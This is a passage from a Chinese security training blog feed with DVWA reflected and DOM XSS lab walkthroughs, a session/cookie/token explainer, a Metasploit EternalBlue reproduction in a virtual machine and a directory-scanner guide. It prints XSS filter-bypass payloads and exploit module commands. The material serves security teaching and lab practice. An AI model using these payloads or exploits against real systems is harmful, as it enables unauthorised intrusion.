class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没什么漏洞，依旧无懈可击~~   世界依然很美好~~</p><h3 id="DVWA——反射型XSS">DVWA——反射型XSS</h3><h4 id="什么是反射型XSS">什么是反射型XSS</h4><p>如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的XSS漏洞。通常，该页面</p><p>会使用一个包含消息文本的参数，并在响应中将这个文本返回给用户。对于开发者而言，使用这种</p><p>机制非常方便，因为它允许他们从应用程序中调用一个定制的错误页面，而不需要对错误页面中的</p><p>消息分别进行硬编码。</p><h4 id="Low-3">Low</h4><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码可以知道，代码没有对Name参数的值做任何过滤，所以很容易存在XSS漏洞。</p><p>在输入框输入<code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code>并提交</p><p>可以成功执行弹窗的恶意代码</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702192744648.png" alt="image-20200702192744648"></p><h4 id="Medium-3">Medium</h4><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤方式同存储型XSS基本相同，都是只过滤<code>&lt;script&gt;</code>字符串，所以可以使用双写或者大写来绕过过滤，也可以使用其他标签实现恶意代码的注入。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hack!&quot;</span>)</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702193120321.png" alt="image-20200702193120321"></p><p>这里使用大写来绕过script的过滤，提交之后弹出自己构造的弹窗，说明攻击成功</p><h4 id="High-3">High</h4><p>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里也是对<code>&lt;script&gt;</code>标签进行了过滤，无法通过对标签大小写变形来实现注入</p><p>注入代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">hacked_high</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>填入注入代码后提交就可以在页面弹窗实现恶意攻击</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702194121523.png" alt="image-20200702194121523"></p><blockquote><p>对于反射型XSS，它的注入参数多半是在URL中提交的，以High级别为例，它的URL是<code> http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cimg+src%3D0+onerror%3Dalert%28%22hacked_high%22%29%3E#</code>，可以看到我们刚才注入的语句也是包含在URL中提交的，所以反射型的XSS是非持久性的。</p></blockquote><h3 id="DOM型XSS">DOM型XSS</h3><h4 id="什么是DOM型XSS">什么是DOM型XSS</h4><p>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无</p><p>关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显</p><p>示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如URL ，location，refelTer</p><p>等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器</p><p>端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生</p><p>DOM XSS漏洞。</p><h4 id="Low-4">Low</h4><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源代码可以看出，这里low级别的代码没有任何的保护性措施</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702200728063.png" alt="image-20200702200728063"></p><p>这里是让我们选择默认语言，但是对default参数没有任何的过滤，所以我们可以在URL中构造XSS代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以看到，代码执行成功了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702200926240.png" alt="image-20200702200926240"></p><h4 id="Medium-4">Medium</h4><p>先看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"><span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do not allow script tags</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，medium级别的代码先检查了default参数是否为空，这里还使用了stripos 用于检测default值中是否有 <code>&lt;script</code> ，如果有的话，则将 default=English</p><p>很明显，这里过滤了<code>&lt;script </code>(不区分大小写)，那么我们可以使用<code>&lt;img src=1 onerror=alert('hack')&gt;</code>进行注入，但是，不行，网页没有弹窗出现</p><p>查看源码发现注入的语句是存在value的值中的，需要闭合前面的option标签，于是添加闭合的语句重新构造：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hack</span>&#x27;)&gt;</span> </span><br></pre></td></tr></table></figure><p>但是我们的注入语句还是没有执行，查看源代码，发现我们注入的语句还是没有逃出<code>&lt;option&gt;</code>标签的魔爪，依然在它的value参数的值中</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703094335426.png" alt="image-20200703094335426"></p><p>看到上面还有<code>&lt;select&gt;</code>标签，于是考虑将select标签再进行闭合，注入的语句为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hack</span>&#x27;)&gt;</span> </span><br></pre></td></tr></table></figure><p>这次是注入成功的</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703094746391.png" alt="image-20200703094746391"></p><p>再查看源码，可以看到我们注入的img标签语句被单独列出来执行了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703094857932.png" alt="image-20200703094857932"></p><h4 id="High-4">High</h4><p>先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment"># White list the allowable languages</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line"><span class="comment"># ok</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器端代码会先判断default的值是否为空，如果不为空则会按照switch语句进行</p><p>匹配，匹配不上则使用默认值。所以我们要想执行代码，不能将代码传入服务器后台，必须使用</p><p>一种无须将代码发送到服务器即可运行代码的方法。</p><p><strong>URL锚</strong>：URL的锚（指URL中<code>#</code>之后的所有内容）不会发送到服务器，所以不会被服务器端的代码阻止掉。</p><p>当我们注入恶意代码的时候，代码不会从服务器加载过来，而是由浏览器加载，从而造成恶意代码的执行。</p><p>含有恶意代码的链接：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English # &lt;script&gt;alert(101)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载链接后，页面产生了弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703111102446.png" alt="image-20200703111102446"></p><p>查看源代码，可以看到恶意代码被加载了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703111156681.png" alt="image-20200703111156681"></p><h4 id="impossible-2">impossible</h4><p>都告诉你不可能了，所以，就想都不要想了—.—</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>session、cookie和token的区别</title>
      <link href="/posts/f9064069.html"/>
      <url>/posts/f9064069.html</url>
      
        <content type="html"><![CDATA[<h2 id="session（会话）">session（会话）</h2><p>session是用户使用web应用请求服务的时候，在服务器端生成的一次会话证明，这个证明会临时保存在服务器端，当用户离开网站或浏览器结束web访问的时候就会被销毁。</p><p>服务器为了区分当前向自己请求服务的是谁，给每个用户分发了一个唯一的“身份标识”（也就是sessionID），当用户使用客户端向服务端发送请求的时候，需要携带该sessionID才能正确请求到服务。</p><h4 id="浏览器和服务器使用session进行交互的过程">浏览器和服务器使用session进行交互的过程</h4><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200701223548.png" alt=""></p><h2 id="cookie">cookie</h2><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200701225250.png" style="zoom:25%;" /><p>cookie是在浏览器客户端存储的一种数据。cookie由服务器生成，发送给浏览器，浏览器把它以文件的形式保存在浏览器的某个目录中。在下一次请求同一网站的时候浏览器会把该cookie发送给服务器，由服务器使用用户名和口令对cookie进行验证。</p><h4 id="cookie的请求流程">cookie的请求流程</h4><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200701231119.png" alt=""></p><h2 id="token（令牌）">token（令牌）</h2><p>token 也称作令牌，由uid+time+sign[+固定参数]加密后生成。</p><p>token 的认证方式类似于临时的证书签名, 并且是一种服务端无状态的认证方式。所谓无状态就是服</p><p>务端并不会保存身份认证相关的数据。</p><h4 id="组成">组成</h4><ul><li>uid: 用户唯一身份标识</li><li>time: 当前时间的时间戳</li><li>sign: 签名, 使用 hash/encrypt 压缩成定长的十六进制字符串，以防止第三方恶意拼接</li><li>固定参数(可选): 将一些常用的固定参数加入到 token 中是为了避免重复查库</li></ul><h4 id="token认证过程">token认证过程</h4><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200701232451.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> session </tag>
            
            <tag> cookie </tag>
            
            <tag> token </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Metasploit复现永恒之蓝攻击</title>
      <link href="/posts/bac2643b.html"/>
      <url>/posts/bac2643b.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-Metaspolit介绍">1.Metaspolit介绍</h2><p>Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具，并保持着频繁更新。被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架。</p><h2 id="2-术语">2.术语</h2><ul><li><p>渗透攻击（Exploit）：指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。</p></li><li><p>攻击载荷（Payload）：是我们期望目标系统在被渗透攻击之后去执行的代码。</p></li><li><p>Shellcode：是在渗透攻击是作为攻击载荷运行的一组机器指令，通常用汇编语言编写。</p></li><li><p>模块（Module）：指Metasploit框架中所使用的一段软件代码组件，可用于发起渗透攻击或执行某些辅助攻击动作。</p></li><li><p>监听器（Listener）：是Metasploit中用来等待网络连接的组件。</p></li></ul><h2 id="3-Metasploit使用">3.Metasploit使用</h2><p>永恒之蓝是2017年公布的一个网络攻击工具，它利用Windows系统的SMB漏洞获取系统的最高权限。微软也在同年发布了MS17-010补丁，修复了“永恒之蓝”攻击的系统漏洞。</p><p>在实验室的电脑上，通过使用nmap对主机进行扫描发现所有的电脑的445端口都是开启状态，并且实验室电脑中的防火墙都是关闭状态，由此猜测电脑可能存在永恒之蓝SMB漏洞。</p><blockquote><p>为了不造成其他不良影响，此次实验在虚拟机中搭建环境进行复现。复现环境：<code>Kali-Linux-2020.1</code> 、<code>Windows 7 Ultimate with sp1 x64</code></p></blockquote><ol><li>先在Kali中测试Windows主机是否能够正常访问</li></ol><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701200351460.png" alt="image-20200701200351460"></p><ol start="2"><li><p>执行<code>mafconsole</code>打开Metasploit</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701201212074.png" alt="image-20200701201212074"></p></li><li><p>搜索关于<code>ms17-010</code>的可使用工具</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701201610039.png" alt="image-20200701201610039"></p><p>可以看到序号为1的工具为SMB漏洞的辅助扫描工具</p></li><li><p>使用扫描工具对目标主机进行扫描</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><p>切换到扫描工具后设置要扫描的主机地址并进行攻击扫描</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701202033580.png" alt="image-20200701202033580"></p><p>可以看到工具扫描出目标主机可能存在对应MS17-010补丁的漏洞</p><ol start="5"><li>使用永恒之蓝攻击</li></ol><p>切换到永恒之蓝工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br></pre></td></tr></table></figure><p>设置目标主机地址后对目标主机进行渗透攻击</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701202341306.png" alt="image-20200701202341306"></p><p>可以看到攻击后直接连接到了Windows系统的命令行中</p><p>在用户桌面创建一个<code>HACKED</code>文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701202655568.png" alt="image-20200701202655568"></p><p>切换到Windows7 可以在桌面上看到刚创建的<code>HACKED</code>文件夹，说明攻击成功</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701202817212.png" alt="image-20200701202817212"></p><h2 id="4-反弹shell">4.反弹shell</h2><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><p>反弹shell攻击就是使用恶意代码让目的主机主动向攻击者发起连接，如远程控制请求连接，从而达到获取目的主机控制权限的目的。上面使用Metasploit实现永恒之蓝漏洞攻击就是一个反弹shell的实例。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> Metasploit </tag>
            
            <tag> 永恒之蓝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御剑——Web后台目录扫描</title>
      <link href="/posts/b86edd0f.html"/>
      <url>/posts/b86edd0f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/%E5%BE%A1%E5%89%91%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E7%8F%8D%E8%97%8F%E7%89%88.zip">御剑下载</a></p></blockquote><p>使用御剑扫描器，可以扫描网站的敏感目录，包括网站后台等。其扫描原理就是爆破，即通过敏感目录的字典去匹配。</p><ol><li><p>扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程</p></li><li><p>集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描</p></li><li><p>默认探测200 (也就是扫描的网站真实存在的路径文件)</p></li></ol><h2 id="使用方法">使用方法</h2><ol><li>打开软件在域名框输入要扫描的网站地址</li></ol><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701090858518.png" alt="image-20200701090858518"></p><ol start="2"><li>在下面可以选择扫描线程以及扫描超时间，还有文件类型等</li></ol><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701091038414.png" alt="image-20200701091038414"></p><ol start="3"><li>全部选择好以后就可以点击开始扫描了</li></ol><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701091203248.png" alt="image-20200701091203248"></p><ol start="4"><li><p>等待扫描好以后在下面会出现扫描结果</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701091233072.png" alt="image-20200701091233072"></p></li></ol><p>扫描结果中左侧是扫描到的网站后台目录的地址，右边则是HTTP的响应码，通过访问这些地址可以找到网站后台的登录页面。</p><p>尝试访问扫描出来的<code>/dede</code>目录会看到网站后台的登录地址</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200701091627497.png" 